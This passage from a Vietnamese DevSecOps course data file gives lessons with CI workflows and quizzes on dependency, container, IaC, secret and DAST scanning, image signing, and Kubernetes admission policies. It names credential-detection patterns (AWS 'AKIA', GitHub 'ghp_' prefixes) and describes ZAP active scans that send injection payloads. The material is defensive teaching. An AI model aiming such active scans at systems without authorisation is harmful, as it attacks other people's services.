      interval: weekly`
        }
      },
      {
        h: "Ưu tiên xử lý",
        p: [
          "Không phải CVE nào cũng nguy hiểm như nhau với bạn. Một lỗ hổng trong devDependency chỉ chạy lúc build ít rủi ro hơn lỗ hổng trong framework web đang nhận request. Hãy ưu tiên theo mức độ nghiêm trọng, có bản vá hay chưa, package có chạy trên production không, và mã lỗi có được gọi tới không. Nếu tạm chấp nhận một lỗ hổng, hãy ghi lại lý do và ngày xem xét lại."
        ]
      }
    ],
    summary: [
      "SCA đối chiếu dependency trong lockfile với cơ sở dữ liệu lỗ hổng.",
      "npm audit, OSV-Scanner, Dependabot, Snyk là công cụ phổ biến.",
      "Chạy trên mỗi PR và theo lịch hằng ngày.",
      "Dependabot cho npm, docker và cả github-actions giúp dependency luôn mới."
    ],
    pitfalls: [
      "Chạy `npm install` thay vì `npm ci` trong CI, cài phiên bản khác lockfile.",
      "Chặn build vì mọi lỗ hổng low trong devDependency, đội quen bỏ qua cảnh báo.",
      "Để hàng chục PR Dependabot tồn đọng nhiều tháng, lúc cần nâng cấp gấp thì chênh quá nhiều phiên bản."
    ],
    quiz: [
      {
        q: "SCA khác SAST ở điểm nào?",
        options: ["SCA phân tích mã do chính bạn viết","SCA kiểm tra dependency bên thứ ba","SCA quét ứng dụng đang chạy qua HTTP","SCA và SAST là một, chỉ khác tên"],
        answer: 1,
        explain: "SCA tập trung vào thành phần bên thứ ba; SAST phân tích mã của bạn; DAST quét ứng dụng đang chạy."
      },
      {
        q: "Vì sao nên chạy SCA theo lịch dù code không đổi?",
        options: ["Để dùng hết phút runner miễn phí","Vì lockfile tự thay đổi theo thời gian","Vì lỗ hổng mới được công bố cho bản cũ","Vì npm bắt buộc audit mỗi ngày"],
        answer: 2,
        explain: "Một dependency an toàn hôm qua có thể có CVE hôm nay. Lockfile không tự thay đổi."
      },
      {
        q: "Ecosystem nào trong Dependabot giúp cập nhật SHA của action?",
        options: ["npm", "docker", "github-actions", "gitsubmodule"],
        answer: 2,
        explain: "`github-actions` cập nhật tham chiếu `uses:` trong workflow, kể cả khi pin theo SHA."
      }
    ]
  },
  "p08.m4.t2": {
    videos: [
      { id: "2cjH6Zkieys", title: "Cloud Security: Container image and IaC scanning with Trivy", channel: "Anais Urlichs", lang: "en", minutes: 11, embed: true }
    ],
    sections: [
      {
        h: "Container image cũng có lỗ hổng",
        p: [
          "Docker image chứa cả hệ điều hành thu nhỏ: thư viện C, OpenSSL, công cụ shell. Code của bạn có thể sạch nhưng base image cũ có hàng chục CVE. Container scanning phân tích các package hệ điều hành và thư viện ngôn ngữ trong image rồi đối chiếu với cơ sở dữ liệu lỗ hổng.",
          "IaC scanning thì kiểm tra cấu hình hạ tầng trước khi áp dụng: Terraform mở security group `0.0.0.0/0`, S3 bucket công khai, Kubernetes Deployment chạy với quyền root hoặc thiếu giới hạn tài nguyên, Dockerfile không có `USER`. Lỗi cấu hình là nguyên nhân phổ biến của rò rỉ dữ liệu trên cloud."
        ]
      },
      {
        h: "Trivy: một công cụ, nhiều loại quét",
        p: [
          "Trivy là công cụ mã nguồn mở của Aqua Security, gom nhiều loại quét vào một binary duy nhất. Mỗi lần chạy nó cần cơ sở dữ liệu lỗ hổng mới, nên trong CI hãy cache thư mục cache của Trivy để không tải lại liên tục. Checkov thì tập trung sâu vào IaC với bộ quy tắc rất lớn."
        ],
        list: [
          "`trivy image`: quét image đã build.",
          "`trivy fs`: quét thư mục mã nguồn, gồm lockfile và secret.",
          "`trivy config`: quét lỗi cấu hình trong Dockerfile, Terraform, Kubernetes manifest, Helm chart.",
          "Checkov: chuyên về IaC, hàng nghìn quy tắc cho Terraform, CloudFormation, Kubernetes, có thể dùng thay hoặc cùng Trivy."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Chặn nếu image có lỗ hổng CRITICAL/HIGH đã có bản vá
trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 ghcr.io/my-org/task-api:a1b2c3d

# Quét cấu hình Terraform và Kubernetes
trivy config --severity HIGH,CRITICAL --exit-code 1 ./infra
trivy config ./k8s

# Checkov cho thư mục Terraform
checkov -d infra --framework terraform`
        }
      },
      {
        h: "Trong pipeline",
        p: [
          "Quét image sau khi build và trước khi push. Quét IaC trong PR, trước `terraform plan`. Checkov action dưới dùng đúng phiên bản đã pin trong Lab 07. Riêng trivy-action, bạn cần đặc biệt cẩn thận: tháng 3/2026 chính các tag của action này đã bị ghi đè thành mã độc, nên chỉ dùng khi pin theo SHA đã kiểm chứng, hoặc chạy Trivy binary/container đã pin digest. Cùng đợt đó binary Trivy v0.69.4 và vài image Docker cũng bị phát hành bản độc hại, nên pin phiên bản công cụ và kiểm tra checksum/chữ ký là việc bắt buộc, không chỉ với action."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/iac.yml",
          src: `name: IaC scan
on:
  pull_request:
    paths: ["infra/**", "k8s/**", "Dockerfile"]

permissions:
  contents: read

jobs:
  checkov:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: bridgecrewio/checkov-action@444c9db6fa75e2d9c19ebf1fde7322089be9009e # v12.3125.0
        with:
          directory: infra
          soft_fail: false

  trivy-config:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          scan-type: config
          scan-ref: .
          severity: CRITICAL,HIGH
          exit-code: "1"`
        }
      },
      {
        h: "Giảm lỗ hổng tận gốc",
        p: [
          "Quét chỉ báo vấn đề; giảm lỗ hổng cần image nhỏ hơn. Dùng multi-stage build để image cuối không chứa compiler và devDependency, chọn base image tối giản (alpine, distroless), rebuild định kỳ để lấy bản vá hệ điều hành. Khi chấp nhận một phát hiện, ghi vào file `.trivyignore` hoặc chú thích skip của Checkov kèm lý do, thay vì hạ ngưỡng cho toàn bộ."
        ]
      }
    ],
    summary: [
      "Container scanning tìm CVE trong package hệ điều hành và thư viện của image.",
      "IaC scanning tìm lỗi cấu hình trong Terraform, Kubernetes, Dockerfile trước khi áp dụng.",
      "Trivy làm được cả hai; Checkov chuyên sâu cho IaC.",
      "Quét trước khi push và trước khi apply; giảm lỗ hổng bằng image tối giản và rebuild định kỳ."
    ],
    pitfalls: [
      "Không dùng `--ignore-unfixed`, build bị chặn vì CVE chưa có bản vá nào để nâng.",
      "Dùng trivy-action theo tag sau sự cố 3/2026 thay vì pin SHA.",
      "Bỏ qua phát hiện bằng cách hạ ngưỡng cho toàn bộ thay vì ghi ngoại lệ có lý do."
    ],
    quiz: [
      {
        q: "Lệnh Trivy nào quét lỗi cấu hình trong Terraform và Kubernetes manifest?",
        options: ["trivy image", "trivy config", "trivy sbom", "trivy server"],
        answer: 1,
        explain: "`trivy config` quét misconfiguration trong IaC. `trivy image` quét image."
      },
      {
        q: "Tác dụng của `--ignore-unfixed`?",
        options: ["Bỏ qua mọi lỗ hổng", "Bỏ qua lỗ hổng chưa có bản vá", "Chỉ quét lỗ hổng low", "Tự sửa lỗ hổng"],
        answer: 1,
        explain: "Lỗ hổng chưa có bản vá thì không có hành động nâng cấp nào, nên thường không dùng để chặn build."
      },
      {
        q: "Cách giảm số CVE trong image hiệu quả nhất?",
        options: ["Multi-stage, base image tối giản, rebuild định kỳ","Tắt quét để build nhanh hơn","Dùng tag latest cho base image","Cài thêm công cụ bảo mật vào image"],
        answer: 0,
        explain: "Image càng ít thành phần càng ít lỗ hổng, và rebuild để lấy bản vá. Tắt quét chỉ che giấu vấn đề."
      }
    ]
  },
  "p08.m4.t3": {
    videos: [
      { id: "vMhDkt5JNN0", title: "Introduction to secret leaks and getting started with GitHub Secret Protection", channel: "GitHub", lang: "en", minutes: 3, embed: true },
      { id: "VB6yohnukGk", title: "Gitleaks - Find Secrets Like API Keys, Tokens, Passwords - Install and Test Locally", channel: "Fahd Mirza", lang: "en", minutes: 11, embed: true }
    ],
    sections: [
      {
        h: "Secret lọt vào Git là chuyện rất thường",
        p: [
          "Một khoá API trong file `.env` bị commit nhầm, một token dán tạm vào code để test, một file cấu hình cũ chứa mật khẩu database. Khi đã vào lịch sử Git, secret vẫn còn đó dù commit sau có xoá đi. Nếu repo công khai, bot của kẻ tấn công quét GitHub liên tục và có thể dùng secret chỉ sau vài phút.",
          "Secret scanning tìm các chuỗi trông giống secret (theo mẫu như tiền tố `AKIA` của AWS, `ghp_` của GitHub, khoá riêng PEM) và chuỗi có độ ngẫu nhiên cao. Cần chặn ở nhiều lớp: máy developer, lúc push, và trong CI."
        ]
      },
      {
        h: "Ba lớp chặn",
        p: [
          "Không lớp nào hoàn hảo, nên hãy kết hợp cả ba. Lớp càng gần developer thì càng rẻ: chặn được trước khi commit nghĩa là secret chưa bao giờ nằm trong lịch sử Git. Lớp CI là lưới an toàn cuối cùng mà không ai bỏ qua được."
        ],
        list: [
          "Pre-commit hook với gitleaks: chặn ngay trên máy trước khi commit được tạo.",
          "GitHub push protection: GitHub từ chối push chứa secret thuộc các mẫu được hỗ trợ; người push phải chủ động bypass và ghi lý do.",
          "CI: quét commit mới của PR bằng gitleaks hoặc trufflehog, vì hook trên máy có thể bị bỏ qua bằng `--no-verify`."
        ],
        code: {
          lang: "yaml",
          file: ".pre-commit-config.yaml",
          src: `repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: <commit-sha>   # pin theo SHA của bản phát hành bạn chọn
    hooks:
      - id: gitleaks`
        }
      },
      {
        h: "Quét trong CI",
        p: [
          "Trufflehog có thể xác minh secret bằng cách thử gọi API của nhà cung cấp, cờ `--results=verified` chỉ báo secret đã được xác minh là còn hoạt động, giảm nhiễu đáng kể (bản cũ dùng cờ `--only-verified`). `--fail` khiến lệnh trả mã lỗi 183 khi có phát hiện, để job CI đỏ. Checkout với `fetch-depth: 0` để có lịch sử cần quét."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/secrets.yml",
          src: `name: Secret scan
on: pull_request

permissions:
  contents: read

jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
      - name: Quét các commit mới của PR
        run: |
          docker run --rm -v "$PWD:/repo" -w /repo ghcr.io/gitleaks/gitleaks:latest \\
            git . --redact --verbose \\
            --log-opts="origin/\${{ github.base_ref }}..HEAD"
        # Nên pin image theo digest thay vì latest

  trufflehog:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
      - run: |
          docker run --rm -v "$PWD:/repo" trufflesecurity/trufflehog:latest \\
            git file:///repo --results=verified --fail`
        }
      },
      {
        h: "Khi secret đã lộ",
        p: [
          "Việc đầu tiên là thu hồi và tạo secret mới (rotate), không phải xoá khỏi lịch sử Git. Xoá lịch sử bằng `git filter-repo` là việc phụ, vì bản clone, fork và cache có thể đã có secret. Sau khi rotate, kiểm tra log truy cập của nhà cung cấp xem secret đã bị dùng chưa. Và hỏi vì sao secret nằm trong code: về lâu dài, secret nên ở secret manager, được nạp lúc chạy."
        ]
      }
    ],
    summary: [
      "Secret đã vào lịch sử Git thì vẫn còn dù commit sau xoá đi.",
      "Chặn ba lớp: pre-commit hook, GitHub push protection, quét trong CI.",
      "gitleaks nhanh theo mẫu; trufflehog có thể xác minh secret còn hoạt động.",
      "Secret lộ thì rotate ngay, xoá lịch sử là việc phụ."
    ],
    pitfalls: [
      "Chỉ dựa vào pre-commit hook, trong khi ai cũng có thể bỏ qua bằng `--no-verify`.",
      "Xoá secret khỏi lịch sử Git mà không rotate, secret vẫn dùng được.",
      "Quét với checkout nông (depth 1), bỏ sót secret trong các commit trước của PR."
    ],
    quiz: [
      {
        q: "Việc đầu tiên cần làm khi phát hiện secret bị commit lên repo công khai?",
        options: ["Xoá khỏi lịch sử Git", "Thu hồi và tạo secret mới (rotate)", "Đổi repo sang private", "Đợi xem có ai dùng không"],
        answer: 1,
        explain: "Secret có thể đã bị sao chép; chỉ rotate mới vô hiệu hoá nó. Xoá lịch sử và đổi private không thu hồi được bản đã bị lấy."
      },
      {
        q: "Vì sao vẫn cần quét secret trong CI dù đã có pre-commit hook?",
        options: ["Vì hook chạy quá chậm trên máy dev","Vì chạy trong CI rẻ hơn","Vì GitHub bắt buộc quét trong CI","Vì hook có thể bị bỏ qua hoặc chưa cài"],
        answer: 3,
        explain: "Hook nằm trên máy cá nhân nên không đảm bảo; CI là lớp kiểm soát tập trung."
      },
      {
        q: "Cờ `--results=verified` của trufflehog có tác dụng gì?",
        options: ["Chỉ quét các file đã commit","Chỉ báo secret đã xác minh còn hoạt động","Bỏ qua mọi secret đã tìm thấy","Chỉ quét lịch sử của nhánh main"],
        answer: 1,
        explain: "Trufflehog thử xác minh secret với nhà cung cấp; cờ này chỉ báo những secret còn dùng được, giảm false positive. Bản cũ dùng cờ tương đương `--only-verified`."
      }
    ]
  },
  "p08.m4.t4": {
    videos: [
      { id: "j9vqvzBPVMw", title: "DAST Scanning with OWASP ZAP and Docker", channel: "Damien Burks", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "DAST: tấn công thử ứng dụng đang chạy",
        p: [
          "DAST (Dynamic Application Security Testing) kiểm tra ứng dụng từ bên ngoài, giống cách kẻ tấn công làm: gửi request HTTP, quan sát response. Nó không cần biết mã nguồn viết bằng ngôn ngữ gì. DAST bắt được những thứ SAST không thấy vì chúng nằm ở cấu hình lúc chạy: thiếu security header, cookie không có cờ `Secure` và `HttpOnly`, CORS quá rộng, trang lỗi lộ stack trace, endpoint quản trị không được bảo vệ.",
          "Vì cần ứng dụng đang chạy, DAST thường chạy trên staging sau khi deploy, hoặc trên preview environment. Nó chậm hơn SAST nhiều nên không phải lúc nào cũng chạy trên mỗi PR."
        ]
      },
      {
        h: "OWASP ZAP: baseline, full và API scan",
        list: [
          "`zap-baseline.py`: spider ứng dụng và chỉ quét thụ động (đọc response, không gửi payload tấn công). Nhanh, an toàn, chạy được mỗi lần deploy staging.",
          "`zap-full-scan.py`: thêm active scan, gửi payload thử SQL injection, XSS... Chậm và có thể tạo dữ liệu rác, chỉ chạy trên môi trường riêng, theo lịch.",
          "`zap-api-scan.py`: quét API dựa trên định nghĩa OpenAPI, hợp với backend REST vì spider không tự tìm được các endpoint JSON."
        ],
        p: [
          "Tuyệt đối không chạy active scan vào production hoặc hệ thống bạn không có quyền kiểm thử."
        ]
      },
      {
        h: "Ví dụ workflow chạy sau khi deploy staging",
        p: [
          "ZAP ghi báo cáo vào thư mục mount tại `/zap/wrk`. Cờ `-I` giúp job không lỗi chỉ vì cảnh báo mức WARN; lỗi mức FAIL vẫn làm job đỏ. File `-c` cho phép đặt từng quy tắc là FAIL, WARN hay IGNORE."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/dast.yml",
          src: `name: DAST
on:
  workflow_run:
    workflows: ["Deploy staging"]
    types: [completed]
  schedule:
    - cron: "0 20 * * 0"   # 03:00 sáng thứ Hai giờ Việt Nam

permissions:
  contents: read

jobs:
  zap-api:
    if: github.event_name == 'schedule' || github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: ZAP API scan
        run: |
          mkdir -p zap && cp .zap/rules.tsv zap/ && chmod -R 777 zap
          docker run --rm -v "$PWD/zap:/zap/wrk:rw" ghcr.io/zaproxy/zaproxy:stable \\
            zap-api-scan.py -t https://staging.example.com/openapi.json -f openapi \\
            -c rules.tsv -r report.html -J report.json -I
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        if: always()
        with:
          name: zap-report
          path: zap/`
        }
      },
      {
        h: "Giới hạn",
        p: [
          "DAST chỉ thấy những gì nó truy cập được. API cần đăng nhập thì phải cấu hình xác thực cho ZAP, nếu không nó chỉ quét trang đăng nhập. DAST cũng không cho biết lỗi nằm ở dòng code nào, nên cần kết hợp với SAST. Hãy xem DAST là lưới an toàn cho cấu hình và hành vi lúc chạy, cộng với pentest thủ công định kỳ cho các hệ thống quan trọng."
        ]
      }
    ],
    summary: [
      "DAST kiểm tra ứng dụng đang chạy từ bên ngoài qua HTTP.",
      "Bắt lỗi cấu hình lúc chạy: header, cookie, CORS, lộ thông tin lỗi.",
      "ZAP baseline quét thụ động, full scan chủ động, API scan dùng OpenAPI.",
      "Chạy trên staging hoặc môi trường riêng, không active scan vào production."
    ],
    pitfalls: [
      "Chạy active scan vào production, tạo dữ liệu rác và có thể gây sự cố.",
      "Không cấu hình xác thực, ZAP chỉ quét trang đăng nhập và báo xanh giả.",
      "Dùng spider cho REST API thuần JSON, không tìm thấy endpoint nào; nên dùng API scan với OpenAPI."
    ],
    quiz: [
      {
        q: "DAST phát hiện được loại vấn đề nào mà SAST thường bỏ sót?",
        options: ["Lỗi cú pháp trong mã nguồn","Dependency đã cũ có CVE","Thiếu security header, cookie sai cờ","Commit message sai quy ước"],
        answer: 2,
        explain: "Header và cookie được cấu hình lúc chạy, thường ở proxy hoặc framework, DAST quan sát trực tiếp từ response."
      },
      {
        q: "`zap-baseline.py` khác `zap-full-scan.py` thế nào?",
        options: ["Baseline chậm hơn full scan","Baseline quét thụ động, full scan gửi payload tấn công","Full scan chỉ kiểm tra header","Baseline gửi payload, full scan chỉ thụ động"],
        answer: 1,
        explain: "Baseline an toàn và nhanh; full scan thêm active scan nên chậm và có thể làm bẩn dữ liệu."
      },
      {
        q: "Với backend REST API, loại quét ZAP nào phù hợp nhất?",
        options: ["Baseline với spider", "API scan dựa trên OpenAPI", "Không cần quét", "Chỉ quét trang chủ"],
        answer: 1,
        explain: "Spider không tự tìm được endpoint JSON; API scan đọc định nghĩa OpenAPI để biết mọi endpoint."
      }
    ]
  },
  "p08.m4.t5": {
    videos: [
      { id: "CM13RNBR9hw", title: "How to Generate an SBOM with Free Open Source Tools", channel: "Anchore", lang: "en", minutes: 30, embed: true },
      { id: "HLb1Q086u6M", title: "Signing and Verifying Container Images With Sigstore Cosign and Kyverno", channel: "DevOps & AI Toolkit", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "Chuỗi cung ứng phần mềm",
        p: [
          "Khi cluster kéo image `task-api@sha256:...` về chạy, làm sao biết image đó thực sự do pipeline của bạn build từ mã trên main, không phải do ai đó push lên registry bằng token bị lộ? Và image đó chứa những gì? Hai câu hỏi này dẫn tới ba khái niệm: SBOM, chữ ký và provenance.",
          "SLSA (Supply-chain Levels for Software Artifacts) là framework mô tả các mức đảm bảo cho chuỗi cung ứng. Với SLSA v1, phần Build track có ba mức: Build L1 là build tạo ra provenance mô tả artifact được build thế nào; Build L2 là build chạy trên nền tảng build được host (như GitHub-hosted runner) và provenance được nền tảng đó ký; Build L3 thêm yêu cầu nền tảng build được gia cố, các lần build cô lập nhau và bước build của người dùng không lấy được khoá ký provenance."
        ],
        list: [
          "SBOM (Software Bill of Materials): danh sách mọi thành phần trong artifact, định dạng SPDX hoặc CycloneDX. Khi có CVE mới, bạn tra được ngay image nào bị ảnh hưởng.",
          "Chữ ký: chứng minh artifact được tạo bởi danh tính cụ thể và không bị sửa.",
          "Provenance: thông tin repo, commit, workflow nào đã build ra artifact."
        ]
      },
      {
        h: "Cosign keyless với OIDC",
        p: [
          "Cosign (dự án Sigstore) hỗ trợ ký keyless: không cần quản lý khoá riêng. Trong GitHub Actions, cosign dùng token OIDC của job để xin chứng chỉ ngắn hạn từ Fulcio, ký image, và ghi bản ghi vào transparency log Rekor. Chứng chỉ ghi rõ danh tính là workflow nào ở repo nào, nhánh nào. Vì vậy job cần `id-token: write`. Luôn ký theo digest, không theo tag."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml (job image)",
          src: `  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write   # cosign keyless dùng OIDC
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/\${{ github.repository }}:\${{ github.sha }}
          sbom: true           # BuildKit đính kèm SBOM attestation
          provenance: mode=max # BuildKit đính kèm provenance
      - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Ký image theo digest
        env:
          IMAGE: ghcr.io/\${{ github.repository }}@\${{ steps.build.outputs.digest }}
        run: cosign sign --yes "$IMAGE"
      - name: SBOM bằng Syft và đính kèm dưới dạng attestation
        env:
          IMAGE: ghcr.io/\${{ github.repository }}@\${{ steps.build.outputs.digest }}
        run: |
          syft "$IMAGE" -o spdx-json=sbom.spdx.json   # giả định đã cài syft
          cosign attest --yes --predicate sbom.spdx.json --type spdxjson "$IMAGE"`
        }
      },
      {
        h: "Xác minh trước khi deploy",
        p: [
          "Ký mà không xác minh thì vô nghĩa. Trước khi deploy, pipeline hoặc admission controller trong cluster (bài tiếp theo) phải kiểm tra chữ ký khớp đúng danh tính mong đợi: đúng repo, đúng workflow, đúng nhánh main, đúng issuer của GitHub."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `cosign verify "ghcr.io/my-org/task-api@sha256:<digest>" \\
  --certificate-identity "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main" \\
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"

# Xác minh attestation SBOM
cosign verify-attestation --type spdxjson "ghcr.io/my-org/task-api@sha256:<digest>" \\
  --certificate-identity "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main" \\
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"`
        }
      },
      {
        h: "GitHub artifact attestations",
        p: [
          "GitHub có sẵn tính năng artifact attestations: action `actions/attest-build-provenance` tạo provenance theo chuẩn SLSA, ký bằng Sigstore, gắn với digest của image. Người dùng xác minh bằng GitHub CLI mà không cần tự cài cosign. Cách này hợp với đội muốn đạt provenance có chữ ký mà ít cấu hình."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Xác minh provenance của image do repo trong tổ chức my-org build
gh attestation verify oci://ghcr.io/my-org/task-api@sha256:<digest> --owner my-org`
        }
      }
    ],
    summary: [
      "SBOM liệt kê thành phần của artifact; chữ ký chứng minh nguồn gốc; provenance mô tả cách build.",
      "Cosign keyless dùng OIDC, không cần quản lý khoá riêng, cần `id-token: write`.",
      "Luôn ký và xác minh theo digest, không theo tag.",
      "Xác minh phải ràng buộc đúng identity (repo, workflow, nhánh) và issuer."
    ],
    pitfalls: [
      "Ký theo tag: tag có thể trỏ sang image khác sau khi ký.",
      "Xác minh chỉ kiểm tra có chữ ký mà không ràng buộc identity, image ký bởi repo bất kỳ cũng qua.",
      "Sinh SBOM nhưng không lưu hoặc không bao giờ tra cứu khi có CVE mới."
    ],
    quiz: [
      {
        q: "Ký keyless bằng cosign trong GitHub Actions cần quyền gì?",
        options: ["contents: write", "id-token: write", "issues: write", "pages: write"],
        answer: 1,
        explain: "Cosign dùng token OIDC của job để xin chứng chỉ ký, nên cần `id-token: write`."
      },
      {
        q: "SBOM giúp gì khi một CVE mới được công bố?",
        options: ["Tra được artifact nào chứa thành phần lỗi","Tự vá lỗ hổng trong image","Ký lại image theo digest mới","Xoá image cũ khỏi registry"],
        answer: 0,
        explain: "SBOM là danh sách thành phần; có nó bạn tìm được image bị ảnh hưởng mà không phải quét lại tất cả. SBOM không tự vá."
      },
      {
        q: "Vì sao `cosign verify` cần `--certificate-identity` và `--certificate-oidc-issuer`?",
        options: ["Để lệnh verify chạy nhanh hơn","Để cosign tạo chữ ký mới khi cần","Vì image ký keyless không có digest","Để chữ ký phải đến từ đúng workflow và issuer"],
        answer: 3,
        explain: "Bất kỳ ai cũng có thể ký keyless với danh tính của họ; ràng buộc identity và issuer mới chứng minh image do pipeline của bạn tạo."
      }
    ]
  },
  "p08.m4.t6": {
    videos: [
      { id: "sMWh4D-Ou_A", title: "Kyverno vs OPA Gatekeeper – Which Policy Engine Rules Kubernetes?", channel: "Is it Observable", lang: "en", minutes: 21, embed: true }
    ],
    sections: [
      {
        h: "Policy as code là gì",
        p: [
          "Quy tắc như \"không container nào chạy bằng root\", \"chỉ deploy image đã ký từ registry của công ty\", \"mọi Deployment phải có giới hạn tài nguyên\" thường nằm trong tài liệu và phụ thuộc vào việc reviewer có nhớ không. Policy as code biến chúng thành mã, được version trong Git, được test, và được thực thi tự động.",
          "Có hai điểm thực thi. Trong CI: kiểm tra manifest trước khi merge bằng conftest (OPA) hoặc Kyverno CLI, phản hồi sớm cho developer. Trong cluster: admission controller (Kyverno hoặc OPA Gatekeeper) chặn resource vi phạm ngay khi gửi tới Kubernetes API. Lớp trong cluster là bắt buộc, vì ai đó có thể `kubectl apply` trực tiếp mà không qua CI."
        ]
      },
      {
        h: "Kyverno: policy viết bằng YAML",
        p: [
          "Kyverno là admission controller dành riêng cho Kubernetes, policy là resource YAML quen thuộc, còn điều kiện kiểm tra viết bằng CEL (Common Expression Language, ngôn ngữ biểu thức mà chính Kubernetes dùng cho ValidatingAdmissionPolicy). Từ Kyverno 1.17 (2/2026), các loại policy CEL như `ValidatingPolicy` và `ImageValidatingPolicy` (`policies.kyverno.io/v1`) là chuẩn; loại cũ `ClusterPolicy` (`kyverno.io/v1`) đã bị đánh dấu deprecated và dự kiến bị gỡ ở bản 1.20. Bạn vẫn sẽ gặp ClusterPolicy trong nhiều repo, nhưng policy mới nên viết theo kiểu mới.",
          "Hai policy dưới đây làm hai việc: bắt buộc `runAsNonRoot`, và buộc mọi image từ `ghcr.io/my-org` phải được ký bởi workflow CI trên nhánh main. Policy viết cho Pod; khối `autogen` yêu cầu Kyverno sinh thêm policy tương ứng cho Deployment, StatefulSet, Job, CronJob để lỗi được báo ngay khi apply Deployment, thay vì chỉ lộ ra khi ReplicaSet không tạo được Pod. Lưu ý: policy chữ ký chỉ kiểm tra image khớp `matchImageReferences`; muốn cấm hẳn registry khác cần thêm một policy riêng."
        ],
        code: {
          lang: "yaml",
          file: "policies/secure-workloads.yaml",
          src: `apiVersion: policies.kyverno.io/v1
kind: ValidatingPolicy
metadata:
  name: require-run-as-non-root
spec:
  validationActions: [Deny]          # [Audit] để chỉ ghi nhận, không chặn
  autogen:
    podControllers:
      controllers: [deployments, statefulsets, jobs, cronjobs]
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
  validations:
    - message: "Pod phải đặt securityContext.runAsNonRoot: true"
      expression: "object.spec.?securityContext.?runAsNonRoot.orValue(false) == true"
---
apiVersion: policies.kyverno.io/v1
kind: ImageValidatingPolicy
metadata:
  name: verify-image-signature
spec:
  validationActions: [Deny]
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
  matchImageReferences:
    - glob: "ghcr.io/my-org/*"
  attestors:
    - name: ci
      cosign:
        keyless:
          identities:
            - subject: "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main"
              issuer: "https://token.actions.githubusercontent.com"
        ctlog:
          url: https://rekor.sigstore.dev
  validations:
    - message: "Image phải được ký bởi workflow CI trên nhánh main"
      expression: >-
        images.containers.map(image, verifyImageSignatures(image, [attestors.ci])).all(e, e > 0)`
        }
      },
      {
        h: "OPA và conftest trong CI",
        p: [
          "OPA (Open Policy Agent) dùng ngôn ngữ Rego, tổng quát hơn: cùng một policy kiểm tra được Kubernetes manifest, Terraform plan, file cấu hình bất kỳ. conftest chạy policy Rego trên file cục bộ, rất hợp để đặt trong CI."
        ],
        code: {
          lang: "text",
          file: "policy/deployment.rego",
          src: `package main

import rego.v1

deny contains msg if {
  input.kind == "Deployment"
  some c in input.spec.template.spec.containers
  not c.resources.limits.memory
  msg := sprintf("container %s phải đặt resources.limits.memory", [c.name])
}

# Chạy trong CI:
#   conftest test k8s/deployment.yaml --policy policy/`
        }
      },
      {
        h: "Đưa policy vào an toàn",
        p: [
          "Bật chế độ chặn ngay trên cluster đang chạy có thể chặn cả deploy khẩn cấp. Hãy bắt đầu ở chế độ Audit (`validationActions: [Audit]`, với ClusterPolicy cũ là `failureAction: Audit`) để xem những gì sẽ bị chặn qua policy report, sửa dần các workload, rồi mới chuyển sang chặn thật (`[Deny]`, với ClusterPolicy cũ là `failureAction: Enforce`). Cần cơ chế ngoại lệ có kiểm soát (ví dụ PolicyException của Kyverno) cho các thành phần hệ thống thực sự cần quyền đặc biệt. Nếu đang có ClusterPolicy cũ, hãy lên kế hoạch chuyển sang loại policy CEL theo hướng dẫn migration của Kyverno trước khi nâng lên bản gỡ bỏ ClusterPolicy."
        ]
      },
      {
        h: "Những policy nên có đầu tiên",
        p: [
          "Đừng viết một trăm policy ngay. Bắt đầu với vài quy tắc có giá trị cao và ít tranh cãi, rồi mở rộng dần khi đội đã quen."
        ],
        list: [
          "Không chạy container bằng root, không `privileged`, không `hostPath` tuỳ ý.",
          "Chỉ cho phép image từ registry của công ty, và image phải được ký.",
          "Bắt buộc có `resources.requests` và `limits` cho bộ nhớ.",
